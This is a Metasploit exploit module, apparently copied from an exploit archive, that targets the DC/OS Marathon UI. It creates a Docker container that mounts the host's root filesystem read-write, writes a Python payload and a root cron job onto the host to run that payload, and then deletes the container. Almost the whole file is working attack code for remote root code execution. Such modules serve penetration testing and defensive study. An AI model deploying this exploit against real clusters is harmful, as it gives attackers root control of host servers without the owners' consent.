# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;DC/OS Marathon UI Docker Exploit&#039;,
      &#039;Description&#039;    => %q{
        Utilizing the DCOS Cluster&#039;s Marathon UI, an attacker can create
        a docker container with the &#039;/&#039; path mounted with read/write
        permissions on the host server that is running the docker container.
        As the docker container executes command as uid 0 it is honored
        by the host operating system allowing the attacker to edit/create
        files owed by root. This exploit abuses this to creates a cron job
        in the &#039;/etc/cron.d/&#039; path of the host server.

        *Notes: The docker image must be a valid docker image from
        hub.docker.com. Further more the docker container will only
        deploy if there are resources available in the DC/OS cluster.
      },
      &#039;Author&#039;         => &#039;Erik Daguerre&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     => [
        [ &#039;URL&#039;, &#039;https://warroom.securestate.com/dcos-marathon-compromise/&#039;],
      ],
      &#039;Targets&#039;            => [
        [ &#039;Python&#039;, {
            &#039;Platform&#039;   => &#039;python&#039;,
            &#039;Arch&#039;       => ARCH_PYTHON,
            &#039;Payload&#039;    => {
              &#039;Compat&#039;   => {
                &#039;ConnectionType&#039; => &#039;reverse noconn none tunnel&#039;
              }
            }
          }
        ]
      ],
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 75 },
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Mar 03, 2017&#039;))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Post path to start docker&#039;, &#039;/v2/apps&#039; ]),
        OptString.new(&#039;DOCKERIMAGE&#039;, [ true, &#039;hub.docker.com image to use&#039;, &#039;python:3-slim&#039; ]),
        OptString.new(&#039;CONTAINER_ID&#039;, [ false, &#039;container id you would like&#039;]),
        OptInt.new(&#039;WAIT_TIMEOUT&#039;, [ true, &#039;Time in seconds to wait for the docker container to deploy&#039;, 60 ])
      ])
  end

  def get_apps
    res = send_request_raw({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => target_uri.path
    })
    return unless res and res.code == 200

    # verify it is marathon ui, and is returning content-type json
    return unless res.headers.to_json.include? &#039;Marathon&#039; and res.headers[&#039;Content-Type&#039;].include? &#039;application/json&#039;
    apps = JSON.parse(res.body)

    apps
  end

  def del_container(container_id)
    res = send_request_raw({
      &#039;method&#039;  => &#039;DELETE&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, container_id)
    })
    return unless res and res.code == 200

    res.code
  end

  def make_container_id
    return datastore[&#039;CONTAINER_ID&#039;] unless datastore[&#039;CONTAINER_ID&#039;].nil?

    rand_text_alpha_lower(8)
  end

  def make_cmd(mnt_path, cron_path, payload_path)
    vprint_status(&#039;Creating the docker container command&#039;)
    payload_data = nil
    echo_cron_path = mnt_path + cron_path
    echo_payload_path = mnt_path + payload_path

    cron_command = "python #{payload_path}"
    payload_data = payload.raw

    command = "echo \"#{payload_data}\" >> #{echo_payload_path}\n"
    command << "echo \"PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin\" >> #{echo_cron_path}\n"
    command << "echo \"\" >> #{echo_cron_path}\n"
    command << "echo \"* * * * * root #{cron_command}\" >> #{echo_cron_path}\n"
    command << "sleep 120"

    command
  end

  def make_container(mnt_path, cron_path, payload_path, container_id)
    vprint_status(&#039;Setting container json request variables&#039;)
    container_data = {
      &#039;cmd&#039;                 => make_cmd(mnt_path, cron_path, payload_path),
      &#039;cpus&#039;                => 1,
      &#039;mem&#039;                 => 128,
      &#039;disk&#039;                => 0,
      &#039;instances&#039;           => 1,
      &#039;id&#039;                  => container_id,
      &#039;container&#039;           => {
        &#039;docker&#039;            => {
          &#039;image&#039;           => datastore[&#039;DOCKERIMAGE&#039;],
          &#039;network&#039;         => &#039;HOST&#039;,
        },
        &#039;type&#039;              => &#039;DOCKER&#039;,
        &#039;volumes&#039;           => [
          {
            &#039;hostPath&#039;      => &#039;/&#039;,
            &#039;containerPath&#039; => mnt_path,
            &#039;mode&#039;          => &#039;RW&#039;
          }
        ],
      },
      &#039;env&#039;                 => {},
      &#039;labels&#039;              => {}
    }

    container_data
  end

  def check
    return Exploit::CheckCode::Safe if get_apps.nil?

    Exploit::CheckCode::Appears
  end

  def exploit
    if get_apps.nil?
      fail_with(Failure::Unknown, &#039;Failed to connect to the targeturi&#039;)
    end
    # create required information to create json container information.
    cron_path = &#039;/etc/cron.d/&#039; + rand_text_alpha(8)
    payload_path = &#039;/tmp/&#039; + rand_text_alpha(8)
    mnt_path = &#039;/mnt/&#039; + rand_text_alpha(8)
    container_id = make_container_id()

    res = send_request_raw({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => target_uri.path,
      &#039;data&#039;    => make_container(mnt_path, cron_path, payload_path, container_id).to_json
    })
    fail_with(Failure::Unknown, &#039;Failed to create the docker container&#039;) unless res and res.code == 201

    print_status(&#039;The docker container is created, waiting for it to deploy&#039;)
    register_files_for_cleanup(cron_path, payload_path)
    sleep_time = 5
    wait_time = datastore[&#039;WAIT_TIMEOUT&#039;]
    deleted_container = false
    print_status("Waiting up to #{wait_time} seconds for docker container to start")

    while wait_time > 0
      sleep(sleep_time)
      wait_time -= sleep_time
      apps_status = get_apps
      fail_with(Failure::Unknown, &#039;No apps returned&#039;) unless apps_status

      apps_status[&#039;apps&#039;].each do |app|
        next if app[&#039;id&#039;] != "/#{container_id}"

        if app[&#039;tasksRunning&#039;] == 1
          print_status(&#039;The docker container is running, removing it&#039;)
          del_container(container_id)
          deleted_container = true
          wait_time = 0
        else
          vprint_status(&#039;The docker container is not yet running&#039;)
        end
        break
      end
    end

    # If the docker container does not deploy remove it and fail out.
    unless deleted_container
      del_container(container_id)
      fail_with(Failure::Unknown, "The docker container failed to start")
    end
    print_status(&#039;Waiting for the cron job to run, can take up to 60 seconds&#039;)
  end
end

